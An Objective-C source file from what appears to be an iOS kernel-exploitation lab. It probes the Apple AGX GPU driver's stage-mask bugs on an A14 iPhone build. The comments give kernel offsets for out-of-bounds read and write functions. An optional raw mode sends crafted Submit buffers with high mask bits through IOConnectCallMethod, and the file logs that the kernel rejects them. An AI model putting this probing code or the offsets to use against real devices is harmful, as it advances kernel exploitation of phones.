//
//  P021AGXStageMask.m
//  P007OpenOnly
//
//  p021 v3 — Metal throwaway observe + optional raw ABI reject (A14 23F77)
//
//  LOCKED RE (packs 16–18 + PRIM_STRENGTH_CASE):
//    - DeviceUC sel=25 = Submit front door (scIn=4).
//    - Stage-mask Class B (23F77):
//        updateBarrierEvent        0x7ff002c  — OOB READ of event slots
//        mergeSubmitEventForStage  0x7ff01c0  — WRITE kernel stamps OOB
//      Reached only AFTER Metal→sel25 → vt+0xb0 → CL/3D parse → encode.
//      Mask on AGX descriptor (+0xc4/+0xc8), NOT IOConnect scalars.
//    - DEFAULT path: throwaway Metal queue + trivial encode/commit/wait,
//      then best-effort read-only SharedStream/+0xc4/+0xc8 observe, else
//      honest MISSING (no private layout walk invented).
//    - Raw IOConnect reject: DEFAULT OFF. Set env P021_RAW=1 to run the
//      historical three-phase 2c2 probe. Never wedge the UI queue as default.
//    - No bit10+ forge. Not KRW. DEAD as first KRW (Glue / PRIM sheet).
//

#import "P021AGXStageMask.h"
#import "A14_23F77_LabOffsets.h"
#import "LabLocalTime.h"

#import <Metal/Metal.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <stdarg.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>

#define P021_BUILD_ID     @"p021-v3-metal-observe"
/* Historical raw probe wrote masks at +0xc4/+0xc8 into a 0xC0 buffer
   (userspace overrun). Allocate enough; kernel still rejects. */
#define P021_BUF_SIZE     0xD0
#define P021_STRUCT_IN    0xC0
#define P021_SEL          A14_23F77_IOGPU_SUBMIT_SEL  /* 25 */

typedef uint32_t (*P021GetConn_t)(void *);
typedef uint32_t (*P021GetQid_t)(void *);
typedef kern_return_t (*P021Iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

static NSMutableString *p021_buf;
static int p021_fd = -1;

static void p021_log(const char *fmt, ...)
{
    char lb[900];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n < 0)
        return;
    if (n > (int)sizeof(lb) - 2)
        n = (int)sizeof(lb) - 2;
    lb[n++] = '\n';
    lb[n] = 0;
    @synchronized ([NSString class]) {
        if (p021_buf)
            [p021_buf appendFormat:@"%.*s", n, lb];
        if (p021_fd >= 0) {
            write(p021_fd, lb, (size_t)n);
            fcntl(p021_fd, F_FULLFSYNC);
        }
    }
}

static NSString *p021_finish(void)
{
    if (p021_fd >= 0) {
        fcntl(p021_fd, F_FULLFSYNC);
        close(p021_fd);
        p021_fd = -1;
    }
    NSString *body = p021_buf ?: @"STOP: no log";
    return [NSString stringWithFormat:
            @"=== LIVE TAP %@ ===\n%@\n", P021_BUILD_ID, body];
}

static id p021_unwrap(id buf)
{
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"])
            break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s])
            break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf)
            break;
        buf = b;
    }
    return buf;
}

static void *p021_ivar(id obj, const char *name)
{
    if (!obj || !name)
        return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val)
            return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p021_strip(void *p)
{
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p021_is_heap(void *p)
{
    uintptr_t x = (uintptr_t)p021_strip(p);
    if (x < 0x100000000ULL)
        return 0;
    if ((x & 7) != 0)
        return 0;
    if ((x >> 28) == 0x16)
        return 0;
    return 1;
}

static const char *p021_kr_hint(kern_return_t kr)
{
    switch ((unsigned)kr) {
    case 0:            return "SUCCESS (unexpected for raw struct-in — classify)";
    case 0xe00002c2:   return "kIOReturnBadArgument — expect MD autda reject";
    case 0xe00002c7:   return "kIOReturnUnsupported";
    case 0xe00002bc:   return "kIOReturnError";
    case 0x100:        return "AGX short stream (type+0xC0 need) — pack18";
    case 0x106:        return "AGX encoder type 0 — pack18";
    default:           return "see pack18 reject ladder";
    }
}

static int p021_raw_enabled(void)
{
    const char *e = getenv("P021_RAW");
    if (!e || !e[0])
        return 0;
    if (e[0] == '0' && e[1] == 0)
        return 0;
    if (!strcasecmp(e, "no") || !strcasecmp(e, "false") || !strcasecmp(e, "off"))
        return 0;
    return 1;
}

/* Historical layout: qword0=type 0x10000, masks at +0xc4/+0xc8.
   Pack18: this shape never reaches stage-mask via raw IOConnect. */
static void p021_build_header(uint8_t *buf, uint32_t mask_c4, uint32_t mask_c8)
{
    memset(buf, 0, P021_BUF_SIZE);
    *(uint64_t *)(buf + 0x00) = 0x10000;
    *(uint32_t *)(buf + 0xc4) = mask_c4;
    *(uint32_t *)(buf + 0xc8) = mask_c8;
}

/* Best-effort: look for a userspace SharedStream-shaped buffer after Metal
   encode. If no stable public walk exists, log MISSING — do not invent. */
static void p021_observe_header_readonly(id mtlCmdBuf)
{
    p021_log("=== phase M2: read-only SharedStream / +0xc4/+0xc8 observe ===");
    p021_log("[cite] RE: mask after encode on descriptor +0xc4/+0xc8");
    p021_log("[cite] type u64 0x10000 then 0xC0 header (Q_P021 Task4)");
    p021_log("[cite] public: agxprobe +0x1040/+0x1540 = READ tables;");
    p021_log("[cite]         BarrierPanic = generateMTLBarriers assert (NOT mergeSubmit)");

    if (!mtlCmdBuf) {
        p021_log("p021 [M2] MISSING: no command buffer object");
        return;
    }

    /* Known private ivar names vary by OS; try a short allowlist only. */
    static const char *cands[] = {
        "_sharedEventListener", /* distractors — skip content */
        "_commandBufferRef",
        "_IOGPUCommandBuffer",
        "_commandStream",
        "_sharedStream",
        NULL
    };
    int any_heap = 0;
    for (int i = 0; cands[i]; i++) {
        void *v = p021_ivar(mtlCmdBuf, cands[i]);
        void *s = p021_strip(v);
        if (p021_is_heap(s)) {
            any_heap = 1;
            p021_log("p021 [M2] ivar %s = %p (heap) — no public +0xc4 walker",
                     cands[i], s);
        } else if (v) {
            p021_log("p021 [M2] ivar %s = %p (not heap / skip)", cands[i], v);
        }
    }

    /* Do NOT scan arbitrary heap for 0x10000 + forge masks. Honest miss. */
    (void)any_heap;
    p021_log("p021 [M2] MISSING: stable userspace SharedStream header map");
    p021_log("p021 [M2] note: Class B still RE-live in kext; observe is cite-only");
    p021_log("p021 [M2] next for mask bytes: Metal encode RE / private AGX dump — not this button");
}

static void p021_run_metal_observe(id<MTLDevice> dev)
{
    p021_log("=== phase M1: throwaway Metal queue encode/commit/wait ===");
    p021_log("[lock] uses a NEW queue — does not poke the UI/hot-path queue");
    p021_log("[lock] NO forged Submit entries; NO bit10+ mask forge");

    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) {
        p021_log("p021 [M1] STOP no throwaway queue");
        return;
    }
    id mtlQ = p021_unwrap(q);
    p021_log("p021 [M1] throwaway q class=%s",
             [NSStringFromClass([mtlQ class]) UTF8String]);

    id<MTLCommandBuffer> cb = [q commandBuffer];
    if (!cb) {
        p021_log("p021 [M1] STOP no command buffer");
        return;
    }

    id<MTLBlitCommandEncoder> blit = [cb blitCommandEncoder];
    if (blit) {
        /* Trivial no-op encode so a real SharedStream path exists in kernel. */
        [blit endEncoding];
        p021_log("p021 [M1] blit encoder endEncoding (trivial)");
    } else {
        p021_log("p021 [M1] no blit encoder — commit empty CB anyway");
    }

    __block int done = 0;
    [cb addCompletedHandler:^(id<MTLCommandBuffer> _Nonnull b) {
        (void)b;
        done = 1;
    }];
    [cb commit];
    [cb waitUntilCompleted];
    p021_log("p021 [M1] commit+wait status=%ld error=%s done=%d",
             (long)cb.status,
             cb.error ? [[cb.error localizedDescription] UTF8String] : "(nil)",
             done);

    p021_observe_header_readonly(p021_unwrap(cb));
}

static void p021_run_raw_reject(uint32_t qConn, uint32_t qid, P021Iocall_t iocall)
{
    p021_log("=== phase R: raw IOConnect reject (P021_RAW=1) ===");
    p021_log("[warn] historical negative probe — can stress qConn; do not spam");
    p021_log("[lock] Pack18 Task6: raw struct-in NEVER reaches stage-mask");
    p021_log("[lock] expect kr!=0: 0xe00002c2 / 0x100 / 0x106");

    vm_address_t bufAddr = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &bufAddr, P021_BUF_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS || !bufAddr) {
        p021_log("p021 [R] STOP vm_allocate failed kr=0x%x", (unsigned)kr);
        return;
    }
    uint8_t *buf = (uint8_t *)(uintptr_t)bufAddr;
    uint64_t in[4] = { qid, 0, 1, P021_STRUCT_IN };

    struct {
        const char *name;
        uint32_t m4, m8;
    } phases[] = {
        { "phase1 mask=0 (ABI baseline)", 0, 0 },
        { "phase2 bit20 (would-be OOB IF hop reached)", (1u << 20), 0 },
        { "phase3 bits20-31 (would-be OOB IF hop reached)", 0xFFF00000u, 0xFFF00000u },
    };

    int reject_ok = 0, unexpected_ok = 0;
    for (int i = 0; i < 3; i++) {
        p021_log("p021 [%s]", phases[i].name);
        p021_build_header(buf, phases[i].m4, phases[i].m8);
        uint64_t out = 0;
        uint32_t nout = 1;
        fcntl(p021_fd, F_FULLFSYNC);
        kr = iocall(qConn, P021_SEL, in, 4,
                    buf, P021_STRUCT_IN,
                    &out, &nout, NULL, NULL);
        p021_log("p021 [%s] sel%u kr=0x%x (%s) out=0x%llx nout=%u",
                 phases[i].name,
                 (unsigned)P021_SEL,
                 (unsigned)kr,
                 p021_kr_hint(kr),
                 (unsigned long long)out,
                 nout);
        if (kr != KERN_SUCCESS)
            reject_ok++;
        else
            unexpected_ok++;
        fcntl(p021_fd, F_FULLFSYNC);
    }

    if (reject_ok == 3 && unexpected_ok == 0) {
        p021_log("=== raw verdict: ABI REJECT as predicted (pack18) ===");
        p021_log("note: 2c2 = success-of-negative; Class B still RE-live");
    } else if (unexpected_ok) {
        p021_log("=== raw verdict: UNEXPECTED SUCCESS — classify; do NOT assume OOB ===");
    } else {
        p021_log("=== raw verdict: MIXED — paste log; still not stage-mask proof ===");
    }

    vm_deallocate(mach_task_self(), bufAddr, P021_BUF_SIZE);
}

@implementation P021AGXStageMask

+ (NSString *)runP021AGXStageMask
{
    p021_buf = [NSMutableString string];
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:
                      @"p021_agx_stage_mask_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p021_fd = open(path.fileSystemRepresentation, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    int raw = p021_raw_enabled();

    p021_log("========================================");
    p021_log("BUILD %s (compiled %s %s)",
             P021_BUILD_ID.UTF8String, __DATE__, __TIME__);
    p021_log("time %s", LabLocalMilitaryNow().UTF8String);
    p021_log("target: iPhone13,2 A14 26.5/23F77");
    p021_log("=== p021 v3: Metal observe + optional raw reject ===");
    p021_log("[cite] DeviceUC sel=%u Submit (23F77) — NOT historical sel 26",
             (unsigned)P021_SEL);
    p021_log("[cite] updateBarrierEvent 0x7ff002c = OOB READ (not KRW store)");
    p021_log("[cite] mergeSubmitEventForStage 0x7ff01c0 = WRITE kernel stamps");
    p021_log("[cite] 23F77: no mask bounds; 23G83 adds Out-of-range string");
    p021_log("[cite] mask on descriptor +0xc4/+0xc8 — NOT IOConnect scalars");
    p021_log("[cite] BarrierPanic ≠ mergeSubmit; agxprobe = READ table family");
    p021_log("[lock] DEFAULT = Metal throwaway; raw reject P021_RAW=%s",
             raw ? "1 (ON)" : "0 (OFF)");
    p021_log("[lock] DEAD as first KRW (PRIM_STRENGTH_CASE / Glue)");
    p021_log("[lock] NOT forged SubmitCommandBuffers; NO bit10+ PoC");
    p021_log("NOT KRW. Diagnostic / observe only.");
    p021_log("========================================");
    fcntl(p021_fd, F_FULLFSYNC);

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu)
        iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu) {
        p021_log("p021 STOP dlopen IOGPU");
        return p021_finish();
    }

    P021GetConn_t devConn = (P021GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    P021GetConn_t qConnFn = (P021GetConn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    P021GetQid_t qGetID = (P021GetQid_t)dlsym(iogpu, "IOGPUCommandQueueGetID");
    void *submitSym = dlsym(iogpu, "IOGPUCommandQueueSubmitCommandBuffers");
    void *nqSym = dlsym(iogpu,
        "IOGPUNotificationQueueDispatchAvailableCompletionNotifications");
    P021Iocall_t iocall = iokit ? (P021Iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    p021_log("p021 [0] SubmitCommandBuffers=%p (cite — Metal path uses framework)", submitSym);
    p021_log("p021 [0] DispatchAvailable=%p (NQ path = button 65)", nqSym);

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) {
        p021_log("p021 STOP no device");
        return p021_finish();
    }
    p021_log("p021 [0] metal %s", [[dev name] UTF8String]);

    /* Default: throwaway Metal — never poke a long-lived UI queue. */
    p021_run_metal_observe(dev);

    if (raw) {
        if (!iocall) {
            p021_log("p021 [R] STOP no IOConnectCallMethod");
        } else {
            /* Separate throwaway queue for connect scrape only. */
            id<MTLCommandQueue> cmdQueue = [dev newCommandQueue];
            id mtlDev = p021_unwrap(dev);
            id mtlQ = p021_unwrap(cmdQueue);
            void *devRef = p021_strip(p021_ivar(mtlDev, "_deviceRef"));
            void *qRef = p021_strip(p021_ivar(mtlQ, "_commandQueue"));
            uint32_t dconn = (devConn && p021_is_heap(devRef)) ? devConn(devRef) : 0;
            uint32_t qConn = (qConnFn && p021_is_heap(qRef)) ? qConnFn(qRef) : 0;
            uint32_t qid = (qGetID && p021_is_heap(qRef)) ? qGetID(qRef) : 0;
            p021_log("p021 [R] dconn=0x%x qConn=0x%x qid=%u", dconn, qConn, qid);
            if (!qConn)
                qConn = dconn;
            if (qConn)
                p021_run_raw_reject(qConn, qid, iocall);
            else
                p021_log("p021 [R] STOP no connect");
        }
    } else {
        p021_log("=== phase R: SKIPPED (set env P021_RAW=1 to enable) ===");
        p021_log("note: prior device run already proved 2c2×3 ABI reject");
    }

    p021_log("========================================");
    p021_log("=== verdict: Metal observe done; stage-mask Class B NOT claimed ===");
    p021_log("next: button 65 = Metal NQ cite; 64788 W/S = FKT Shape-1");
    p021_log("NOT KRW. Diagnostic only.");
    fcntl(p021_fd, F_FULLFSYNC);

    return p021_finish();
}

@end
